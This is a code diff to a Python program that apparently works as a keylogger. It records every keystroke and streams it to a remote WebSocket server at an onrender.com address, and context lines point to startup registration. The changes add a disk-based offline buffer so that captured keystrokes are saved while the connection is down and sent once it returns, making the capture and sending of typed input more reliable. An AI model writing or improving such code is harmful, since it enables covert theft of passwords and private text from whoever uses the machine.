@@ -28,6 +28,11 @@ log = logging.getLogger(__name__)
 # CONFIG
 # =========================
 URI = "wss://wan-data-t.onrender.com/ws"
+OFFLINE_BUFFER_FILE = "offline_buffer.txt"
+
+# State and locks
+is_connected = False
+_file_lock = threading.Lock()
 
 # FIX M1 — Proper shutdown: one threading.Event drives ALL threads/tasks.
 # When ESC is pressed or Exit is clicked, shutdown_event is set and every
@@ -40,6 +45,62 @@ _async_shutdown: asyncio.Event | None = None  # checked by async (WS) tasks
 # ensuring thread-safe delivery into the async event loop.
 _loop: asyncio.AbstractEventLoop | None = None
 async_message_queue: asyncio.Queue = asyncio.Queue()
+
+
+def _append_to_offline_file(msg: str):
+    """Append a message to the offline buffer file. Thread-safe."""
+    with _file_lock:
+        try:
+            with open(OFFLINE_BUFFER_FILE, "a", encoding="utf-8") as f:
+                f.write(msg + "\n")
+            log.info("[Buffer] Saved offline: %s", msg)
+        except OSError as e:
+            log.error("[Buffer] Failed to write to offline file: %s", e)
+
+
+async def flush_offline_buffer(websocket):
+    """Reads the offline buffer file and sends all pending messages in order. Thread-safe."""
+    if not os.path.exists(OFFLINE_BUFFER_FILE):
+        return
+
+    log.info("[WS] Flushing offline buffer...")
+    with _file_lock:
+        try:
+            with open(OFFLINE_BUFFER_FILE, "r", encoding="utf-8") as f:
+                lines = f.readlines()
+        except OSError as e:
+            log.error("[WS] Failed to read offline buffer file: %s", e)
+            return
+
+    if not lines:
+        return
+
+    unsent_index = 0
+    try:
+        for i, line in enumerate(lines):
+            msg = line.rstrip('\n')
+            await websocket.send(msg)
+            log.info("[WS] Sent offline buffered message: %s", msg)
+            unsent_index = i + 1
+    except (ConnectionClosed, WebSocketException, OSError) as e:
+        log.error("[WS] Failed to send buffered message at index %d: %s", unsent_index, e)
+        # Rewrite the remaining unsent messages to the file
+        with _file_lock:
+            try:
+                with open(OFFLINE_BUFFER_FILE, "w", encoding="utf-8") as f:
+                    f.writelines(lines[unsent_index:])
+            except OSError as we:
+                log.error("[WS] Failed to rewrite remaining buffered messages: %s", we)
+        raise  # bubble up to trigger reconnection/disconnect handling
+
+    # If we got here, all messages were successfully sent
+    with _file_lock:
+        try:
+            os.remove(OFFLINE_BUFFER_FILE)
+            log.info("[WS] Offline buffer cleared successfully.")
+        except OSError as e:
+            log.error("[WS] Failed to delete offline buffer file: %s", e)
+
 
 # =========================
 # STARTUP REGISTRATION
@@ -206,12 +267,21 @@ def _enqueue_message(msg: str):
         _loop.call_soon_threadsafe(async_message_queue.put_nowait, msg)
 
 
+def _process_generated_message(msg: str):
+    """Router for messages: sends to event loop if connected, otherwise appends to file."""
+    global is_connected
+    if is_connected:
+        _enqueue_message(msg)
+    else:
+        _append_to_offline_file(msg)
+
+
 def _flush_buffer():
     """Called by the inactivity timer — send whatever is in typed_buffer."""
     global typed_buffer
     with _buffer_lock:
         if typed_buffer:
-            _enqueue_message(typed_buffer)
+            _process_generated_message(typed_buffer)
             typed_buffer = ""
 
 
@@ -256,9 +326,9 @@ def on_press(key):
         # Space: flush buffer + send a space token, then reset the idle timer
         if key == keyboard.Key.space:
             if typed_buffer:
-                _enqueue_message(typed_buffer)
+                _process_generated_message(typed_buffer)
                 typed_buffer = ""
-            _enqueue_message("[Space]")
+            _process_generated_message("[Space]")
             _reset_flush_timer()   # restart timer (nothing left in buffer, but harmless)
 
         # Printable character
@@ -267,9 +337,9 @@ def on_press(key):
             if char in FLUSH_PUNCTUATION:
                 # Punctuation: flush current word, send punctuation separately
                 if typed_buffer:
-                    _enqueue_message(typed_buffer)
+                    _process_generated_message(typed_buffer)
                     typed_buffer = ""
-                _enqueue_message(char)
+                _process_generated_message(char)
                 _reset_flush_timer()
             else:
                 # Normal letter/digit: append and reset the inactivity timer
@@ -279,9 +349,9 @@ def on_press(key):
         # Special key: flush buffer immediately, then send the special key
         else:
             if typed_buffer:
-                _enqueue_message(typed_buffer)
+                _process_generated_message(typed_buffer)
                 typed_buffer = ""
-            _enqueue_message(label)
+            _process_generated_message(label)
             _reset_flush_timer()
             # ESC is no longer a shutdown trigger — it just sends [Esc]
 
@@ -307,17 +377,41 @@ def start_keyboard_listener():
 PING_INTERVAL       = 25   # seconds between keepalive pings
 MAX_RECONNECT_DELAY = 60   # FIX #1 — cap exponential backoff at 60 s
 
+def _dump_queue_to_offline_file(failed_msg: str | None):
+    """Saves any failed/pending messages in the queue to the offline buffer file and clears it."""
+    global is_connected
+    is_connected = False
+    with _file_lock:
+        try:
+            with open(OFFLINE_BUFFER_FILE, "a", encoding="utf-8") as f:
+                if failed_msg is not None:
+                    f.write(failed_msg + "\n")
+                    log.info("[Buffer] Saved failed msg to file: %s", failed_msg)
+
+                # Drain the asyncio.Queue
+                while not async_message_queue.empty():
+                    try:
+                        msg = async_message_queue.get_nowait()
+                        f.write(msg + "\n")
+                        log.info("[Buffer] Saved queued msg to file: %s", msg)
+                    except asyncio.QueueEmpty:
+                        break
+        except OSError as e:
+            log.error("[Buffer] Failed to write queue to offline file: %s", e)
+
 
 async def send_messages(websocket):
     """Drain async_message_queue and send; also send keepalive pings."""
     last_ping = asyncio.get_event_loop().time()
-    while not _async_shutdown.is_set():
-        try:
-            # asyncio.Queue with timeout; no polling of stdlib queue
+    msg = None
+    try:
+        while not _async_shutdown.is_set():
+            msg = None
             try:
                 msg = await asyncio.wait_for(async_message_queue.get(), timeout=0.05)
                 await websocket.send(msg)
                 log.info("Sent: %s", msg)
+                msg = None
             except asyncio.TimeoutError:
                 pass  # nothing to send this tick
 
@@ -327,16 +421,16 @@ async def send_messages(websocket):
                 await websocket.ping()
                 last_ping = now
                 log.info("[Ping] keepalive sent")
-
-        except ConnectionClosed as e:
-            log.warning("[WS] send_messages: connection closed — %s", e)
-            break
-        except WebSocketException as e:
-            log.error("[WS] send_messages: WebSocket error — %s", e, exc_info=True)
-            break
-        except OSError as e:
-            log.error("[WS] send_messages: network error — %s", e, exc_info=True)
-            break
+    except (ConnectionClosed, WebSocketException, OSError) as e:
+        log.warning("[WS] send_messages: connection lost — %s. Dumping queue.", e)
+        _dump_queue_to_offline_file(msg)
+    except asyncio.CancelledError:
+        log.info("[WS] send_messages: cancelled. Dumping queue.")
+        _dump_queue_to_offline_file(msg)
+        raise
+    except Exception as e:
+        log.error("[WS] send_messages: unexpected error: %s. Dumping queue.", e, exc_info=True)
+        _dump_queue_to_offline_file(msg)
 
 
 async def receive_messages(websocket):
@@ -361,7 +455,7 @@ async def websocket_client():
     Auto-reconnection with exponential back-off.
     FIX M1 — Loops on _async_shutdown instead of global bool `running`.
     """
-    global _loop, _async_shutdown
+    global _loop, _async_shutdown, is_connected
     _loop = asyncio.get_event_loop()         # expose loop for keyboard thread
     _async_shutdown = asyncio.Event()        # FIX M1 — async shutdown signal
     delay = 2
@@ -376,6 +470,10 @@ async def websocket_client():
                 open_timeout=15,
             ) as websocket:
                 log.info("[WS] Connected ✓")
+                # Flush the offline buffer first before routing new keyboard inputs
+                await flush_offline_buffer(websocket)
+
+                is_connected = True
                 delay = 2  # reset backoff on successful connection
                 await asyncio.gather(
                     send_messages(websocket),
@@ -392,6 +490,8 @@ async def websocket_client():
         except asyncio.CancelledError:
             log.info("[WS] Cancelled, shutting down.")
             break
+        finally:
+            is_connected = False
 
         if _async_shutdown.is_set():
             break
